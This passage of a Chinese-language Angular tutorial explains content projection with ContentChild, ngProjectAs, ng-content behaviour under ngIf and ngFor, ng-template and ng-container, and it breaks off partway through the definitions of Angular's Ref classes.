<span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-child'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;p&gt;Child Component&lt;/p&gt;  
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ChildComponent</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> string <span class="token operator">=</span> <span class="token string">'child-component'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// parent.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> ContentChild<span class="token punctuation">,</span> AfterContentInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> ChildComponent <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./child.component'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token string">'exe-parent'</span><span class="token punctuation">,</span>
    template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
      &lt;p&gt;Parent Component&lt;/p&gt;  
      &lt;ng-content&gt;&lt;/ng-content&gt;
    </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ParentComponent</span> <span class="token keyword">implements</span> <span class="token class-name">AfterContentInit</span> <span class="token punctuation">{</span>
    @<span class="token function">ContentChild</span><span class="token punctuation">(</span>ChildComponent<span class="token punctuation">)</span>
    childCmp<span class="token operator">:</span> ChildComponent<span class="token punctuation">;</span>
    <span class="token function">ngAfterContentInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">dir</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>childCmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// app.component.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;h4&gt;Welcome to Angular World&lt;/h4&gt;
    &lt;exe-parent&gt;
      &lt;exe-child&gt;&lt;/exe-child&gt;
    &lt;/exe-parent&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br></div></div><p>以上代码运行后，控制台的输出结果：</p> <p><img src="/vuebloger/img/post/1201986887-58c91aa3db0f3_fix732.png" alt=""></p> <p>ContentChildren,Content Projection 方式设置的视图中获取匹配的多个元素，返回的结果是一个 QueryList 集合,不再赘述。</p> <h3 id="ngprojectas"><a href="#ngprojectas" class="header-anchor">#</a> ngProjectAs</h3> <p>有时你的内部组件会被隐藏在另一个更大的组件中。有时你只需要将其包装在额外的容器中即可应用 ngIf 或 ngSwitch。无论什么原因，通常情况下，你的内部组件不是包装器的直接子节点。看看我们的目标投影会发生什么：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>wrapper<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>counter<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>counter<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>wrapper<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>现在 ng-container 容器不再匹配 select=&quot;counter&quot;。为了解决这个问题，我们必须使用 ngProjectAs 属性，它可以应用于任何元素上。具体如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>wrapper<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container ngProjectAs<span class="token operator">=</span><span class="token string">&quot;counter&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>counter<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>counter<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>wrapper<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="多个ng-content-ngif-ngfor"><a href="#多个ng-content-ngif-ngfor" class="header-anchor">#</a> 多个ng-content/ngIf/ngFor</h3> <p>我们从一个简单的实验开始：将两个 <code>&lt;ng-content&gt;</code> 块放在我们的模板中，没有选择器。会出现什么情况？</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// counter.js</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> instances <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'counter'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token string">'&lt;h1&gt;{{this.id}}&lt;/h1&gt;'</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">Counter</span> <span class="token punctuation">{</span>
  id<span class="token operator">:</span> number<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token operator">++</span>instances<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">//wrap.html</span>
<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;box red&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>ng<span class="token operator">-</span>content<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>content<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;box blue&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>ng<span class="token operator">-</span>content<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>content<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><p>答案是我们在最后一个 <code>&lt;ng-content&gt;</code> 中得到一个计数器，另一个是空的！在我们尝试解释为什么之前，让我们再来验证一个问题，即在 ng-content 指令的外层容器中添加 ngIf 指令：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'wrapper'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;button (click)=&quot;show = !show&quot;&gt;
      {{ show ? 'Hide' : 'Show' }}
    &lt;/button&gt;
    &lt;div class=&quot;box&quot; *ngIf=&quot;show&quot;&gt;
      &lt;ng-content&gt;&lt;/ng-content&gt;
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">Wrapper</span> <span class="token punctuation">{</span>
  show <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>如果你通过按钮进行切换操作，你会注意到计数器的值不会增加。这意味着我们的计数器组件只被实例化了一次 - 从未被销毁和重新创建。难道这是 ngIf 指令产生的问题，让我们测试一下 ngFor 指令，看看是否有同样的问题：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'wrapper'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;div class=&quot;box&quot; *ngFor=&quot;let item of items&quot;&gt;
      &lt;ng-content&gt;&lt;/ng-content&gt;
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">Wrapper</span> <span class="token punctuation">{</span>
  items <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><p>以上代码运行后与我们使用多个 <code>&lt;ng-content&gt;</code> 的效果是一样的，只会显示一个计数器。<code>&lt;ng-content&gt;</code> 不会 &quot;产生&quot; 内容，它只是投影现有的内容。你可以认为它等价于 <code>node.appendChild(el)</code> 或 jQuery 中的 <code>$(node).append(el)</code> 方法：使用这些方法，节点不被克隆，它被简单地移动到它的新位置。因此，投影内容的生命周期将被绑定到它被声明的地方，而不是显示在地方。</p> <p>这种行为有两个原因：期望一致性和性能。什么 &quot;期望的一致性&quot; 意味着作为开发人员，可以基于应用程序的代码，猜测其行为。假设我写了以下代码：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>my-wrapper<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>counter</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>counter</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>很显然计数器将被实例化一次，但现在假如我们使用第三方库的组件：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>third-party-wrapper</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>counter</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>counter</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>third-party-wrapper</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>如果第三方库能够控制 counter 组件的生命周期，我将无法知道它被实例化了多少次。其中唯一方法就是查看第三方库的代码，了解它们的内部处理逻辑。将组件的生命周期被绑定到我们的应用程序组件而不是包装器的意义是，开发者可以掌控计数器只被实例化一次，而不用了解第三方库的内部代码。</p> <p>性能的原因更为重要。因为 ng-content 只是移动元素，所以可以在编译时完成，而不是在运行时，这大大减少了实际应用程序的工作量。</p> <p>为了让包装器能够控制其子元素的实例化，我们可以通过两种方式完成：在我们的内容周围使用 <code>&lt;ng-template&gt;</code> 元素，或者使用带有 &quot;*&quot; 语法的结构指令。为简单起见，我们将在示例中使用<code>&lt;ng-template&gt;</code>语法，我们的新应用程序如下所示：</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>wrapper</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ng-template</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>counter</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>counter</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ng-template</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>wrapper</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>包装器不再使用 <code>&lt;ng-content&gt;</code>，因为它接收到一个模板。我们需要使用 @ContentChild 访问模板，并使用ngTemplateOutlet 来显示它：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'wrapper'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
    &lt;button (click)=&quot;show = !show&quot;&gt;
      {{ show ? 'Hide' : 'Show' }}
    &lt;/button&gt;
    &lt;div class=&quot;box&quot; *ngIf=&quot;show&quot;&gt;
      &lt;ng-container [ngTemplateOutlet]=&quot;template&quot;&gt;&lt;/ng-container&gt;
    &lt;/div&gt;
  </span><span class="token template-punctuation string">`</span></span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">Wrapper</span> <span class="token punctuation">{</span>
  show <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
  @<span class="token function">ContentChild</span><span class="token punctuation">(</span>TemplateRef<span class="token punctuation">)</span> template<span class="token operator">:</span> TemplateRef<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

现在我们的 counter 组件，每当我们隐藏并重新显示时都正确递增！让我们再验证一下 <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">*ngFor</span><span class="token template-punctuation string">`</span></span> 指令：
<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">js
@Component({
  selector: 'wrapper',
  template: </span><span class="token template-punctuation string">`</span></span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;box&quot;</span> <span class="token operator">*</span>ngFor<span class="token operator">=</span><span class="token string">&quot;let item of items&quot;</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token punctuation">[</span>ngTemplateOutlet<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;template&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  `
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">class</span> <span class="token class-name">Wrapper</span> <span class="token punctuation">{</span>
  items <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  @<span class="token function">ContentChild</span><span class="token punctuation">(</span>TemplateRef<span class="token punctuation">)</span> template<span class="token operator">:</span> TemplateRef<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><p>上面代码成功运行后，每个盒子中有一个计数器，显示 1，2 和 3，这正是我们之前预期的结果。</p> <h2 id="ng-template-ng-container"><a href="#ng-template-ng-container" class="header-anchor">#</a> ng-template/ng-container</h2> <p><code>&lt;ng-container&gt;</code> 是一个逻辑容器，可用于对节点进行分组，它将被渲染为 HTML中的 comment 元素,它可用于避免添加额外的元素来使用结构指令。
<code>&lt;ng-template&gt;</code>：使用 * 语法糖的结构指令，最终都会转换为 <code>&lt;ng-template&gt;</code> 或 <code>&lt;template&gt;</code> 模板指令，模板内的内容如果不进行处理，是不会在页面中显示的。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>ng<span class="token operator">-</span>template<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span> In template<span class="token punctuation">,</span> no attributes<span class="token punctuation">.</span> <span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>template<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span> In ng<span class="token operator">-</span>container<span class="token punctuation">,</span> no attributes<span class="token punctuation">.</span> <span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>以上代码运行后，浏览器中输出结果是：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>In ng<span class="token operator">-</span>container<span class="token punctuation">,</span> no attributes<span class="token punctuation">.</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>即 <code>&lt;ng-template&gt;</code> 中的内容不会显示。当在上面的模板中应用 ngIf 指令：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>ng<span class="token operator">-</span>template <span class="token punctuation">[</span>ngIf<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;true&quot;</span><span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span> ngIf <span class="token keyword">with</span> a template<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>template<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>ng<span class="token operator">-</span>container <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;true&quot;</span><span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span>p<span class="token operator">&gt;</span> ngIf <span class="token keyword">with</span> an ng<span class="token operator">-</span>container<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>ng<span class="token operator">-</span>container<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>以上代码运行后，浏览器中输出结果是：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>ngIf <span class="token keyword">with</span> a template<span class="token punctuation">.</span>
ngIf <span class="token keyword">with</span> an ng<span class="token operator">-</span>container<span class="token punctuation">.</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="ref汇总"><a href="#ref汇总" class="header-anchor">#</a> Ref汇总</h2> <p>Angular 的口号是 - &quot;一套框架，多种平台。同时适用手机与桌面 (One framework.Mobile &amp; desktop.)&quot;，即 Angular 是支持开发跨平台的应用，比如：Web 应用、移动 Web 应用、原生移动应用和原生桌面应用等。
为了能够支持跨平台，Angular 通过抽象层封装了不同平台的差异，统一了 API 接口。如定义了抽象类 Renderer 、抽象类 RootRenderer 等。此外还定义了以下引用类型：ElementRef、TemplateRef、ViewContainerRef 、ViewRef 、 EmbeddedViewRef 和  ComponentRef ,ApplicationRef等</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// ElementRef的定义</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ElementRef</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> nativeElement<span class="token operator">:</span> any<span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">nativeElement<span class="token operator">:</span> any</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">this</span><span class="token punctuation">.</span>nativeElement <span class="token operator">=</span> nativeElement<span class="token punctuation">;</span> <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// TemplateRef的定义</span>
<span class="token keyword">export</span> declare abstract <span class="token keyword">class</span> <span class="token class-name">TemplateRef</span><span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>
    elementRef<span class="token operator">:</span> ElementRef<span class="token punctuation">;</span>
    abstract <span class="token function">createEmbeddedView</span><span class="token punctuation">(</span>context<span class="token operator">:</span> <span class="token constant">C</span><span class="token punctuation">)</span><span class="token operator">:</span> EmbeddedViewRef<span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// ViewRef</span>
<span class="token keyword">export</span> declare abstract <span class="token keyword">class</span> <span class="token class-name">ViewRef</span> <span class="token punctuation">{</span>
    destroyed<span class="token operator">:</span> boolean<span class="token punctuation">;</span>
    abstract <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
    abstract <span class="token function">onDestroy</span><span class="token punctuation">(</span>callback<span class="token operator">:</span> Function<span class="token punctuation">)</span><span class="token operator">:</span> any<span class="token punctuation">;</span>
    <span class="token comment">// 继承自 core/ChangeDetectorRef</span>
    abstract <span class="token function">markForCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
    abstract <span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
    abstract <span class="token function">detectChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
    abstract <span class="token function">checkNoChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
    abstract <span class="token function">reattach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
<span class="token punctuation">}</span>
<span class="token comment">// ChangeDetectorRef</span>
abstract <span class="token keyword">class</span> <span class="token class-name">ChangeDetectorRef</span> <span class="token punctuation">{</span>
  abstract <span class="token function">markForCheck</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
  abstract <span class="token function">detach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
  abstract <span class="token function">detectChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
  abstract <span class="token function">checkNoChanges</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
  abstract <span class="token function">reattach</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span>
<span class="token punctuation">}</span>
<span class="token comment">//EmbeddedViewRef</span>
<span class="token keyword">export</span> declare abstract <span class="token keyword">class</span> <span class="token class-name">EmbeddedViewRef</span><span class="token operator">&lt;</span><span class="token constant">C</span><span class="token operator">&gt;</span> <span class="token keyword">extends</span> <span class="token class-name">ViewRef</span> <span class="token punctuation">{</span>
    context<span class="token operator">:</span> <span class="token constant">C</span><span class="token punctuation">;</span>
    rootNodes<span class="token operator">:</span> any<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 保存&lt;template&gt;模板中定义的元素</span>
    abstract <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> <span class="token keyword">void</span><span class="token punctuation">;</span> <span class="token comment">// 用于销毁视图</span>
<span class="token punctuation">}</span>
<span class="token comment">//ViewContainerRef</span>
abstract <span class="token keyword">class</span> <span class="token class-name">ViewContainerRef</span> <span class="token punctuation">{</span>
  abstract element<span class="token operator">:</span> ElementRef
  abstract injector<span class="token operator">:</span> Injector
  abstract parentInjector<span class="token operator">:</span> Injector
